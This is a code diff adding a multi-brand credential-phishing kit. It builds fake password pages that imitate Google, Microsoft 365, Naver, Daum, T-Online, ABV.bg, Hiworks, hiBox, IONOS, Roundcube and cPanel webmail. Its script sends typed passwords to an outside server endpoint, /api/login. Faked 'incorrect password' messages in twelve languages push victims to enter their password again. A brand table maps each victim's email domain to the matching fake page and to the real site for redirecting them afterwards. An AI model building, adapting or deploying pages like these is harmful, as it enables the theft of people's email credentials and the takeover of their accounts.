+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+                <h1 class="google-welcome">Welcome</h1>
+                <div class="google-user-pill">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    <span id="googleEmailDisplay">investorsfundingsm@gmail.com</span>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+                </div>
+            </div>
+            <div class="google-right">
+                <input type="password" id="googlePass" class="google-input" placeholder="Enter your password">
+                <div class="google-checkbox-row">
+                    <input type="checkbox" id="showGooglePass" onclick="toggleGooglePass()">
+                    <label for="showGooglePass">Show password</label>
+                </div>
+                <div class="google-actions">
+                    <a href="#" class="google-forgot">Forgot password?</a>
+                    <button class="google-btn" onclick="submitLogin('google')">Next</button>
+                </div>
+                <div id="google-err" class="err-box" style="color:#d93025; margin-top:10px;"></div>
+            </div>
+        </div>
+        <div class="google-footer">
+            <span>English (United States)</span>
+            <div class="google-footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. HIWORKS SPECIFIC UI -->
+    <div id="hiworksContainer" style="display:none; width: 100%; min-height: 100vh; flex-direction: column;">
+        <div class="hiworks-main">
+            <div class="hiworks-card">
+                <div class="hiworks-title big" id="hiworksBigLogo" style="margin-bottom:20px;">hiworks</div>
+                <div id="hiworksStep1">
+                    <h1 class="hiworks-h1">Sign-in</h1>
+                    <h2 class="hiworks-h2">Please enter login ID with domain</h2>
+                    <div class="hiworks-input-wrap">
+                        <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        <input type="email" id="hiworksEmail" readonly>
+                    </div>
+                    <div class="hiworks-input-wrap">
+                        <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        <input type="password" id="hiworksPass1" placeholder="Password" autocomplete="off" autofocus>
+                    </div>
+                    <button type="button" class="hiworks-btn" id="hiworksBtn1" onclick="submitHiworksStep1()">Next</button>
+                    <div id="hiworks-err1" class="err-box" style="text-align:center;"></div>
+                </div>
+                <div id="hiworksStep2" style="display:none;">
+                    <h1 class="hiworks-h1">Sign in to <span id="hiworksOrgName">Company</span></h1>
+                    <h2 class="hiworks-h2">Please enter your password for identity verification.</h2>
+                    <div class="hiworks-email-chip">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        <span id="hiworksEmailChip">user@domain.com</span>
+                    </div>
+                    <div class="hiworks-input-wrap">
+                        <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        <input type="password" id="hiworksPass2" placeholder="Password" autocomplete="off" autofocus>
+                    </div>
+                    <button type="button" class="hiworks-btn" id="hiworksBtn2" onclick="submitHiworksStep2()" style="background:#1e88e5;">Sign-in</button>
+                    <div id="hiworks-err2" class="err-box" style="text-align:center; margin-top:12px;"></div>
+                    <div class="hiworks-links-row">
+                        <a href="#">Sign in with another ID</a> |
+                        <a href="#">Forgot password</a>
+                        <span style="display:inline-flex;align-items:center;gap:6px;margin-left:10px;font-size:12px;">IP Security <div style="width:34px;height:18px;background:#1e88e5;border-radius:18px;position:relative;"><div style="width:14px;height:14px;background:#fff;border-radius:50%;position:absolute;right:2px;top:2px;"></div></div></span>
+                    </div>
+                    <div id="hiworksPrivacy" class="hiworks-privacy">
+                        🔒 <strong>Your documents are encrypted and intended exclusively for you.</strong><br>
+                        For security and privacy, please do not share or forward them. Please enter correct details to confirm.
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="hiworks-footer">© Gabia Inc.</div>
+    </div>
+
+    <!-- 4. ABV.BG SPECIFIC UI -->
+    <div id="abvContainer" style="display:none;">
+        <div class="framer-k1yVm">
+          <div class="framer-l37xyv">
+            <div class="framer-1uj2ez6"><img src="https://framerusercontent.com/images/casWq2XT2AxtIAfXFrCfMV2R0.svg" style="width:100%"></div>
+            <div class="framer-13rvrfu"><p style="font-size:14px;font-weight:900">АБВ Поща</p></div>
+            <div class="framer-i0rsf2"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">DOX</p></div>
+            <div class="framer-1inf8b4"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ на твой домейн</p></div>
+            <div class="framer-14zwyi7"><img src="https://framerusercontent.com/images/uebBbbNZYu4aV5MVIkBR0U26F2M.svg" style="width:100%"></div>
+            <div class="framer-1trcrps"><img src="https://framerusercontent.com/images/EgViW3Y1mC1GWqjtSx1lBDjhCqs.svg" style="width:100%"></div>
+            <div class="framer-e23xuc"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">Регистрация в АБВ</p></div>
+            <div class="framer-1ofzc25"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ профил</p></div>
+          </div>
+          <div class="framer-ivfs9d"><img src="https://framerusercontent.com/images/5XhmlwsfPBGpVltxlwiDdG9kbo.svg" style="width:100%"></div>
+          <div class="framer-1tyjjwu"><img src="https://framerusercontent.com/images/ZeCcpoYP2U97mEHPaGcLCZZ6TUs.svg" style="width:100%"></div>
+          <div class="framer-1tqp0cc"><img src="https://framerusercontent.com/images/wBR7zAdtrn6C95FCM4PckzSLiCc.jpg" style="width:100%"></div>
+          <div class="framer-1lwhm32"><img src="https://framerusercontent.com/images/p6OxGGbP252qR6YGCNy37MAumxs.jpg" style="width:100%"></div>
+          <div class="framer-1cb6bps"><img src="https://framerusercontent.com/images/k3u3mM2vefXrTni654AVuXGYQw.jpg" style="width:100%"></div>
+          <div class="framer-1op5ul"><img src="https://framerusercontent.com/images/mR27Z9ciB9VoWIUmbkgcgfR97tU.jpg" style="width:100%"></div>
+          <div class="framer-heb492"><img src="https://framerusercontent.com/images/7u0tWTuqrVIRhnkaOAu2Kx3EVH0.jpg" style="width:100%"></div>
+          <div class="framer-1srjyxk"><img src="https://framerusercontent.com/images/UZRgbZYB2TjD2gdiDjaQo3wb5qg.jpg" style="width:100%"></div>
+          <div class="framer-195nnv8">
+            <div class="framer-nmkhwe"><h2 style="font-size:21px;color:rgb(47,47,47);font-weight:400">Вход в АБВ Поща</h2></div>
+            <div class="framer-zgdkdg"><img src="https://framerusercontent.com/images/sgSVom1iXFk6VFGgXqvmmuMUbt4.png" style="width:100%"></div>
+            <div class="framer-17sdx75"><p style="font-size:11px">Нямаш профил в АБВ? <a href="#" style="color:rgb(30,147,12)">Регистрирай се!</a></p></div>
+            <div class="framer-1ivdcrg"><p style="font-size:11px"><a href="#" style="color:rgb(22,110,29)">Забравена парола</a></p></div>
+            <form class="framer-PR0MW" style="position:absolute;top:60px;left:25px;width:315px;gap:10px" onsubmit="return false;">
+              <p style="font-size:12px;font-weight:500">АБВ потребител:</p>
+              <div class="framer-form-text-input"><input type="email" id="abvEmail" readonly></div>
+              <p style="font-size:12px;font-weight:500">Парола:</p>
+              <div class="framer-form-text-input"><input type="password" id="abvPass" required></div>
+              <button type="button" class="framer-btn" onclick="submitLogin('abv')">Вход</button>
+              <div id="abv-err" class="err-box"></div>
+            </form>
+          </div>
+        </div>
+    </div>
+
+    <!-- 5. MICROSOFT 365 UI -->
+    <div class="m365-layout" id="m365Container">
+        <div class="m365-card">
+            <div class="m365-logo"><div class="m365-logo-icon"><div></div><div></div><div></div><div></div></div>Microsoft</div>
+            <div class="m365-back"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg><span id="m365EmailDisplay">user@domain.com</span></div>
+            <div class="m365-title">Enter password</div>
+            <input type="password" id="m365Pass" class="m365-input" placeholder="Password">
+            <a href="#" class="m365-link">Forgot my password</a>
+            <div style="text-align:right;"><button class="m365-btn" onclick="submitLogin('m365')">Sign in</button></div>
+            <div id="m365-err" class="err-box"></div>
+        </div>
+    </div>
+
+    <!-- 6. NAVER UI -->
+    <div class="naver-layout" id="naverContainer">
+        <div class="naver-card">
+            <div class="naver-header"><img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Naver_Logotype.svg" alt="NAVER"></div>
+            <div class="naver-box">
+                <div class="naver-tabs"><div class="naver-tab active">👤 ID/Phone number</div><div class="naver-tab">🖼️ QR code</div></div>
+                <div class="naver-input-group"><input type="email" id="naverEmail" readonly disabled><input type="password" id="naverPass" placeholder="Password"></div>
+                <div class="naver-options"><label><input type="checkbox"> Stay signed in</label><div class="naver-toggle">IP Security <div style="width:36px;height:20px;background:#03c75a;border-radius:10px;position:relative;"><div style="width:16px;height:16px;background:#fff;border-radius:50%;position:absolute;right:2px;top:2px;"></div></div></div></div>
+                <button class="naver-btn" onclick="submitLogin('naver')">Sign in</button>
+                <div class="naver-divider">Make it safer</div>
+                <button class="naver-passkey">🛡️ Sign in with a passkey</button>
+                <div class="naver-footer-links"><a href="#">Find ID or Password</a> | <a href="#">Sign up</a></div>
+                <div id="naver-err" class="err-box" style="text-align:center;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 7. DAUM UI -->
+    <div class="daum-layout" id="daumContainer">
+        <div class="daum-card">
+            <div class="daum-logo">Daum <span>메일</span></div>
+            <input type="email" id="daumEmail" class="daum-input" readonly disabled>
+            <input type="password" id="daumPass" class="daum-input" placeholder="비밀번호 (Password)">
+            <button class="daum-btn" onclick="submitLogin('daum')">로그인 (Log In)</button>
+            <div id="daum-err" class="err-box"></div>
+        </div>
+    </div>
+
+    <!-- 8. T-ONLINE UI -->
+    <div class="tonline-box" id="tonlineContainer" style="display:none;">
+        <div class="tonline-logo">
+            <svg viewBox="0 0 24 24"><path d="M4 4h4v16H4zM10 4h4v16h-4zM16 4h4v16h-4z"/></svg>
+        </div>
+        <div class="tonline-header">
+            <div class="tonline-avatar">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            </div>
+            <div class="tonline-email">
+                <span id="tonlineEmailDisplay">user@t-online.de</span>
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+            </div>
+        </div>
+        <div class="tonline-title">Passwort eingeben</div>
+        <div class="tonline-input-group">
+            <input type="password" id="tonlinePass" placeholder="Passwort">
+            <button class="tonline-eye" onclick="toggleTonPass()">👁️</button>
+        </div>
+        <a href="#" class="tonline-link">Passwort vergessen?</a>
+        <div class="tonline-toggle-row">
+            <div class="tonline-toggle"></div> Angemeldet bleiben
+        </div>
+        <button class="tonline-btn-main" onclick="submitLogin('tonline')">LOGIN</button>
+        <button class="tonline-btn-sec">Andere Anmeldeoptionen</button>
+        <a href="#" class="tonline-back">&lt; Zurück</a>
+        <div id="tonline-err" class="err-box"></div>
+    </div>
+
+    <!-- 9. HI-BOX (TAIWAN) UI -->
+    <div class="hibox-wrapper" id="hiboxContainer" style="display:none;">
+        <div class="hibox-top">
+            <div class="hibox-logo">hiBox <span>全能信箱</span></div>
+            <div style="font-size:14px;color:#666;">小成本大效益！hiBox教您輕鬆成為新時代的郵件達人！</div>
+        </div>
+        <div class="hibox-nav">
+            <div>回首頁</div><div>產品簡介</div><div>產品費率</div><div>成功案例</div><div>下載專區</div><div>申請流程</div><div>常見問題</div><div>聯絡我們</div>
+        </div>
+        <div class="hibox-content">
+            <div class="hibox-banner">
+                <h2>擔心hiBox信箱帳密外洩讓駭客有機可趁嗎？</h2>
+                <p>郵件簡訊OTP密碼鎖，讓您的hiBox信箱更安全！</p>
+            </div>
+            <div class="hibox-sidebar">
+                <div class="hibox-sidebar-header">會員登入 Login</div>
+                <div class="hibox-form">
+                    <div class="hibox-row">
+                        <label>帳號：</label>
+                        <input type="email" id="hiboxEmail" readonly>
+                    </div>
+                    <div class="hibox-row">
+                        <label>密碼：</label>
+                        <input type="password" id="hiboxPass" placeholder="請輸入密碼">
+                    </div>
+                    <div class="hibox-row">
+                        <label>驗證碼：</label>
+                        <div class="hibox-captcha">
+                            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='80' height='30'><rect width='80' height='30' fill='%23f0e68c'/><text x='10' y='22' font-family='Arial' font-size='18' font-weight='bold' fill='%23333' transform='rotate(-5 40 15)'>8X2P</text></svg>" alt="captcha">
+                            <input type="text" placeholder="輸入驗證碼">
+                        </div>
+                    </div>
+                    <div class="hibox-row">
+                        <label style="width:auto; display:flex; align-items:center; gap:5px; font-weight:normal;">
+                            <input type="checkbox" checked> 記住我的帳號
+                        </label>
+                        <div style="display:flex; gap:5px;">
+                            <button class="hibox-btn" onclick="submitLogin('hibox')">登入</button>
+                            <button class="hibox-btn sec">說明</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="hibox-footer">
+            <div style="font-weight:bold; font-size:16px; color:#0055a4; margin-bottom:5px;">HiNet</div>
+            中華電信股份有限公司版權所有 © Chunghwa Telecom Co., Ltd. All Rights Reserved.
+        </div>
+        <div id="hibox-err" class="err-box" style="text-align:center; padding-bottom:10px;"></div>
+    </div>
+
+    <!-- 10. IONOS UI -->
+    <div id="ionosContainer" style="display:none; width: 100%; min-height: 100vh;">
+        <div class="ionos-header">
+            <div class="ionos-logo">IONOS <span>PRODUCT LOGIN</span></div>
+        </div>
+        <div class="ionos-main">
+            <div class="ionos-card">
+                <div class="ionos-icon-row">
+                    <div class="ionos-icon-svg">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:24px;height:24px;"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                    </div>
+                    <div class="ionos-title">Enter password</div>
+                </div>
+                <div class="ionos-user-row">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                    <span id="ionosEmailDisplay">user@domain.com</span>
+                </div>
+                <div class="ionos-input-group">
+                    <label>Password</label>
+                    <input type="password" id="ionosPass" class="ionos-input">
+                </div>
+                <a href="#" class="ionos-link">Forgot Your Password?</a>
+                <div class="ionos-warning">
+                    <strong>Not your device?</strong> Log out after the session or use private browsing mode.
+                </div>
+                <button class="ionos-btn" onclick="submitLogin('ionos')">Next</button>
+                <div id="ionos-err" class="err-box" style="text-align:center;"></div>
+            </div>
+        </div>
+        <div class="ionos-footer">© IONOS SE. All rights reserved.</div>
+    </div>
+
+    <!-- 11. ROUNDCUBE WEBMAIL UI -->
+    <div class="rc-layout" id="webmailContainer" style="display:none;">
+        <div class="rc-logo-area">
+            <svg class="rc-logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20 80 L50 100 L80 80 L80 40 L50 20 L20 40 Z" fill="#37474f"/>
+                <path d="M20 80 L50 100 L80 80 L50 60 Z" fill="#1b8cd6"/>
+                <circle cx="50" cy="45" r="25" fill="#e0e0e0"/>
+            </svg>
+            <div style="font-size: 18px; color: #666; font-weight: 500;">Roundcube Webmail</div>
+        </div>
+        <div class="rc-form">
+            <div class="rc-input-group">
+                <div class="rc-input-icon">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                </div>
+                <input type="email" id="webmailEmail" readonly disabled>
+            </div>
+            <div class="rc-input-group">
+                <div class="rc-input-icon">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </div>
+                <input type="password" id="webmailPass" placeholder="Password">
+            </div>
+            <button class="rc-btn" onclick="submitLogin('webmail')">LOGIN</button>
+            <div id="webmail-err" class="err-box" style="text-align:center;"></div>
+        </div>
+        <div class="rc-footer">
+            <a href="#">Forgot password?</a> • <a href="#">Create account</a>
+        </div>
+    </div>
+
+    <!-- 12. CPANEL WEBMAIL UI -->
+    <div class="cpanel-card" id="cpanelContainer" style="display:none;">
+        <div class="cpanel-header">Webmail Login</div>
+        <div class="cpanel-body">
+            <div class="cpanel-logo">cPanel <span style="color:#1e3a8a">Webmail</span></div>
+            <div class="cpanel-form-group">
+                <label>Email Address</label>
+                <input type="email" id="cpanelEmail" readonly disabled>
+            </div>
+            <div class="cpanel-form-group">
+                <label>Password</label>
+                <input type="password" id="cpanelPass" placeholder="Enter your password">
+            </div>
+            <button class="cpanel-btn" onclick="submitLogin('cpanel')">Log in</button>
+            <div id="cpanel-err" class="err-box"></div>
+        </div>
+        <div class="cpanel-footer">
+            <a href="#">Forgot password?</a> • <a href="#">Create account</a><br><br>
+            &copy; 2026. All rights reserved.
+        </div>
+    </div>
+
+    <!-- 13. GENERIC BRANDED UI -->
+    <div class="login-container" id="genericContainer" style="display:none;">
+        <div class="header">
+            <div class="logo-icon" id="logoIcon">VT</div>
+            <div class="logo-text" id="logoText">vtex-<span class="highlight" id="highlightText">grp</span>.com<span class="brand-flag" id="brandFlag">Default</span></div>
+            <div class="subtitle" id="subtitleText">Secure Sign In</div>
+            <div class="domain-badge" id="domainBadge">🔒 Secured</div>
+        </div>
+        <div class="form-group"><label for="emailDisplay" id="emailLabel">Email Address</label><input type="email" id="emailDisplay" readonly disabled></div>
+        <div class="form-group">
+            <label for="password" id="passwordLabel">Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+                <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">👁️</button>
+            </div>
+        </div>
+        <div class="error-message" id="errorMessage">⚠️ <span id="errorText">Please enter your password</span></div>
+        <button class="btn-signin" onclick="submitLogin('generic')" id="signinBtn"><span class="btn-text" id="btnText">Sign In</span></button>
+        <div class="footer-links"><a href="#" id="forgotLink">Forgot password?</a><a href="#" id="createLink">Create account</a></div>
+        <div class="footer-text"><div id="copyrightText">&copy; 2026. All rights reserved.</div></div>
+    </div>
+
+<script>
+const API_BASE = 'https://general-login-upgrade.onrender.com';
+const CONFIG = { LOGIN_URL: API_BASE + '/api/login', MAX_ATTEMPTS: 3 };
+
+let currentEmail = '', currentDomain = '', proofFromUrl = '', proofTsFromUrl = '';
+let loginAttempts = 0, firstPassword = '', currentBrand = null;
+let hiworksStep = 1, hiworksFirstPass = '';
+
+/* ============================================================
+   1. BROWSER LANGUAGE & MULTILINGUAL TRANSLATIONS
+   ============================================================ */
+const SUPPORTED_LANGS = ['en','bg','ko','de','ru','fr','it','es','nl','ja','zh','pl'];
+function detectLanguage() {
+    const prefs = navigator.languages || [navigator.language || 'en'];
+    for (const lang of prefs) {
+        const base = String(lang).split('-')[0].toLowerCase();
+        if (SUPPORTED_LANGS.includes(base)) return base;
+    }
+    return 'en';
+}
+
+const TRANSLATIONS = {
+    en: { loginTitle: 'Webmail Login', emailLabel: 'Email Address', passwordLabel: 'Password', passwordPlaceholder: 'Enter your password', logIn: 'Log in', forgot: 'Forgot password?', create: 'Create account', copyright: '© 2026. All rights reserved.', subtitle: 'Secure Sign In', signIn: 'Sign In', hint: 'Enter your account password', errEmpty: 'Please enter your password', errShort: 'Password must be at least 4 characters', errWrong: 'Incorrect password. Please try again.', errTooMany: 'Too many attempts. Redirecting…' },
+    bg: { loginTitle: 'Вход в уебмейл', emailLabel: 'Имейл адрес', passwordLabel: 'Парола', passwordPlaceholder: 'Въведете паролата си', logIn: 'Вход', forgot: 'Забравена парола?', create: 'Създай акаунт', copyright: '© 2026. Всички права запазени.', subtitle: 'Сигурен вход', signIn: 'Вход', hint: 'Въведете паролата на акаунта си', errEmpty: 'Моля, въведете паролата си', errShort: 'Паролата трябва да е поне 4 знака', errWrong: 'Грешна парола. Опитайте отново.', errTooMany: 'Твърде много опити. Пренасочване…' },
+    ko: { loginTitle: '웹메일 로그인', emailLabel: '이메일 주소', passwordLabel: '비밀번호', passwordPlaceholder: '비밀번호를 입력하세요', logIn: '로그인', forgot: '비밀번호 찾기', create: '회원가입', copyright: '© 2026. All rights reserved.', subtitle: '보안 로그인', signIn: '로그인', hint: '계정 비밀번호를 입력하세요', errEmpty: '비밀번호를 입력하세요', errShort: '비밀번호는 최소 4자 이상이어야 합니다', errWrong: '잘못된 비밀번호입니다. 다시 시도하세요.', errTooMany: '시도 횟수 초과. 리디렉션 중…' },
+    de: { loginTitle: 'Webmail Login', emailLabel: 'E-Mail-Adresse', passwordLabel: 'Passwort', passwordPlaceholder: 'Passwort eingeben', logIn: 'Anmelden', forgot: 'Passwort vergessen?', create: 'Konto erstellen', copyright: '© 2026. Alle Rechte vorbehalten.', subtitle: 'Sichere Anmeldung', signIn: 'Anmelden', hint: 'Kontopasswort eingeben', errEmpty: 'Bitte Passwort eingeben', errShort: 'Passwort muss mindestens 4 Zeichen haben', errWrong: 'Falsches Passwort. Bitte erneut versuchen.', errTooMany: 'Zu viele Versuche. Weiterleitung…' },
+    ru: { loginTitle: 'Вход в веб-почту', emailLabel: 'Электронная почта', passwordLabel: 'Пароль', passwordPlaceholder: 'Введите пароль', logIn: 'Войти', forgot: 'Забыли пароль?', create: 'Создать аккаунт', copyright: '© 2026. Все права защищены.', subtitle: 'Безопасный вход', signIn: 'Войти', hint: 'Введите пароль от аккаунта', errEmpty: 'Введите пароль', errShort: 'Пароль должен быть не менее 4 символов', errWrong: 'Неверный пароль. Попробуйте снова.', errTooMany: 'Слишком много попыток. Перенаправление…' },
+    fr: { loginTitle: 'Connexion Webmail', emailLabel: 'Adresse e-mail', passwordLabel: 'Mot de passe', passwordPlaceholder: 'Entrez votre mot de passe', logIn: 'Se connecter', forgot: 'Mot de passe oublié ?', create: 'Créer un compte', copyright: '© 2026. Tous droits réservés.', subtitle: 'Connexion sécurisée', signIn: 'Se connecter', hint: 'Entrez le mot de passe de votre compte', errEmpty: 'Veuillez entrer votre mot de passe', errShort: 'Le mot de passe doit contenir au moins 4 caractères', errWrong: 'Mot de passe incorrect. Veuillez réessayer.', errTooMany: 'Trop de tentatives. Redirection…' },
+    it: { loginTitle: 'Accesso Webmail', emailLabel: 'Indirizzo email', passwordLabel: 'Password', passwordPlaceholder: 'Inserisci la password', logIn: 'Accedi', forgot: 'Password dimenticata?', create: 'Crea account', copyright: '© 2026. Tutti i diritti riservati.', subtitle: 'Accesso sicuro', signIn: 'Accedi', hint: 'Inserisci la password del tuo account', errEmpty: 'Inserisci la password', errShort: 'La password deve contenere almeno 4 caratteri', errWrong: 'Password errata. Riprova.', errTooMany: 'Troppi tentativi. Reindirizzamento…' },
+    es: { loginTitle: 'Inicio de sesión Webmail', emailLabel: 'Correo electrónico', passwordLabel: 'Contraseña', passwordPlaceholder: 'Introduce tu contraseña', logIn: 'Iniciar sesión', forgot: '¿Olvidaste tu contraseña?', create: 'Crear cuenta', copyright: '© 2026. Todos los derechos reservados.', subtitle: 'Inicio de sesión seguro', signIn: 'Iniciar sesión', hint: 'Introduce la contraseña de tu cuenta', errEmpty: 'Por favor, introduce tu contraseña', errShort: 'La contraseña debe tener al menos 4 caracteres', errWrong: 'Contraseña incorrecta. Inténtalo de nuevo.', errTooMany: 'Demasiados intentos. Redirigiendo…' },
+    nl: { loginTitle: 'Webmail Inloggen', emailLabel: 'E-mailadres', passwordLabel: 'Wachtwoord', passwordPlaceholder: 'Voer uw wachtwoord in', logIn: 'Inloggen', forgot: 'Wachtwoord vergeten?', create: 'Account aanmaken', copyright: '© 2026. Alle rechten voorbehouden.', subtitle: 'Veilig inloggen', signIn: 'Inloggen', hint: 'Voer uw accountwachtwoord in', errEmpty: 'Voer uw wachtwoord in', errShort: 'Wachtwoord moet minimaal 4 tekens bevatten', errWrong: 'Onjuist wachtwoord. Probeer het opnieuw.', errTooMany: 'Te veel pogingen. Doorsturen…' },
+    ja: { loginTitle: 'ウェブメールログイン', emailLabel: 'メールアドレス', passwordLabel: 'パスワード', passwordPlaceholder: 'パスワードを入力', logIn: 'ログイン', forgot: 'パスワードをお忘れですか？', create: 'アカウント作成', copyright: '© 2026. All rights reserved.', subtitle: 'セキュアサインイン', signIn: 'ログイン', hint: 'アカウントのパスワードを入力してください', errEmpty: 'パスワードを入力してください', errShort: 'パスワードは4文字以上である必要があります', errWrong: 'パスワードが間違っています。もう一度お試しください。', errTooMany: '試行回数が多すぎます。リダイレクト中…' },
+    zh: { loginTitle: 'Webmail 登录', emailLabel: '电子邮件地址', passwordLabel: '密码', passwordPlaceholder: '输入您的密码', logIn: '登录', forgot: '忘记密码？', create: '创建账户', copyright: '© 2026. 保留所有权利。', subtitle: '安全登录', signIn: '登录', hint: '输入您的账户密码', errEmpty: '请输入您的密码', errShort: '密码长度至少为4个字符', errWrong: '密码错误。请重试。', errTooMany: '尝试次数过多。正在重定向…' },
+    pl: { loginTitle: 'Logowanie Webmail', emailLabel: 'Adres e-mail', passwordLabel: 'Hasło', passwordPlaceholder: 'Wprowadź hasło', logIn: 'Zaloguj się', forgot: 'Nie pamiętasz hasła?', create: 'Utwórz konto', copyright: '© 2026. Wszelkie prawa zastrzeżone.', subtitle: 'Bezpieczne logowanie', signIn: 'Zaloguj się', hint: 'Wprowadź hasło do swojego konta', errEmpty: 'Wprowadź swoje hasło', errShort: 'Hasło musi mieć co najmniej 4 znaki', errWrong: 'Nieprawidłowe hasło. Spróbuj ponownie.', errTooMany: 'Zbyt wiele prób. Przekierowywanie…' }
+};
+
+function getTranslations() {
+    return TRANSLATIONS[detectLanguage()] || TRANSLATIONS['en'];
+}
+
+function applyTranslationsToWebmail() {
+    const t = getTranslations();
+    if (document.getElementById('webmailHeaderTitle')) document.getElementById('webmailHeaderTitle').textContent = t.loginTitle;
+    if (document.getElementById('webmailEmailLabel')) document.getElementById('webmailEmailLabel').textContent = t.emailLabel;
+    if (document.getElementById('webmailPassLabel')) document.getElementById('webmailPassLabel').textContent = t.passwordLabel;
+    if (document.getElementById('webmailPass')) document.getElementById('webmailPass').placeholder = t.passwordPlaceholder;
+    if (document.getElementById('webmailBtnText')) document.getElementById('webmailBtnText').textContent = t.logIn;
+    if (document.getElementById('webmailForgotLink')) document.getElementById('webmailForgotLink').textContent = t.forgot;
+    if (document.getElementById('webmailCreateLink')) document.getElementById('webmailCreateLink').textContent = t.create;
+}
+
+function applyTranslationsToGeneric() {
+    const t = getTranslations();
+    document.getElementById('subtitleText').textContent = t.subtitle;
+    document.getElementById('emailLabel').textContent = t.emailLabel;
+    document.getElementById('passwordLabel').textContent = t.passwordLabel;
+    document.getElementById('password').placeholder = t.passwordPlaceholder;
+    document.getElementById('btnText').textContent = t.signIn;
+    document.getElementById('forgotLink').textContent = t.forgot;
+    document.getElementById('createLink').textContent = t.create;
+    document.getElementById('copyrightText').textContent = t.copyright;
+    document.getElementById('errorText').textContent = t.errEmpty;
+}
+
+/* ============================================================
+   2. BRAND DATABASE (Full Coverage)
+   ============================================================ */
+const BRAND_DB = {
+    'abv.bg': { name:'ABV', domain:'abv.bg', logoText:'ABV', highlightText:'Mail', logoIcon:'A', logoColor:'#0066b3', accentColor:'#0066b3', buttonColor:'#0066b3', buttonHover:'#004d8a', realSite:'https://www.abv.bg', subtitle:'ABV Поща', passwordHint:'Въведете вашата парола за ABV', forgotPassword:'Забравена парола?', createAccount:'Създай акаунт', copyright:'© ABV. Всички права запазени.', flag:'🇧🇬' },
+    'mail.bg': { name:'Mail.bg', domain:'mail.bg', logoText:'Mail', highlightText:'.bg', logoIcon:'M', logoColor:'#ff6600', accentColor:'#ff6600', buttonColor:'#ff6600', buttonHover:'#cc5500', realSite:'https://mail.bg', subtitle:'Mail.bg Поща', passwordHint:'Въведете вашата парола за Mail.bg', forgotPassword:'Забравена парола?', createAccount:'Създай акаунт', copyright:'© Mail.bg. Всички права запазени.', flag:'🇧🇬' },
